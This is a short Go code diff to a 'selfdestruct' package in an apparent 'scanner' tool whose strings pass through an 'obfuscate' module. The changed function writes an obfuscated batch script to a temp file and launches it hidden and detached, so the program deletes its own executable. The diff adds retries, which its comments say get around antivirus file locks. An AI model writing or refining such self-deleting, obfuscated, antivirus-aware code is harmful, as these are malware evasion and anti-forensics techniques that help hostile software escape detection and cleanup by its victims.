@@ -4,9 +4,9 @@
 package selfdestruct
 
 import (
-	"fmt"
 	"os"
 	"os/exec"
+	"strings"
 	"syscall"
 
 	"scanner/internal/obfuscate"
@@ -26,7 +26,12 @@ func DeleteExecutable(exePath string) error {
 		return err
 	}
 	tmpName := tmp.Name()
-	content := fmt.Sprintf(obfuscate.DEL_FMT(), obfuscate.PING_WAIT(), exePath)
+	// The bat retries the deletion in a loop (up to 15 tries, ~1s apart):
+	// a single del can silently fail while the exe is still locked
+	// (antivirus scan, slow handle release).
+	// NOTE: plain placeholder substitution, NOT fmt.Sprintf — the bat is full
+	// of %VAR% syntax that Sprintf would mangle (e.g. %T -> type verb).
+	content := strings.ReplaceAll(obfuscate.DEL_FMT(), "@EXEPATH@", exePath)
 
 	if _, err := tmp.WriteString(content); err != nil {
 		return err
@@ -35,7 +40,7 @@ func DeleteExecutable(exePath string) error {
 
 	c := exec.Command(obfuscate.CMD(), obfuscate.CMD_C(), tmpName)
 	c.SysProcAttr = &syscall.SysProcAttr{
-		HideWindow: true,
+		HideWindow:    true,
 		CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP | 0x00000008,
 	}
 	return c.Start()
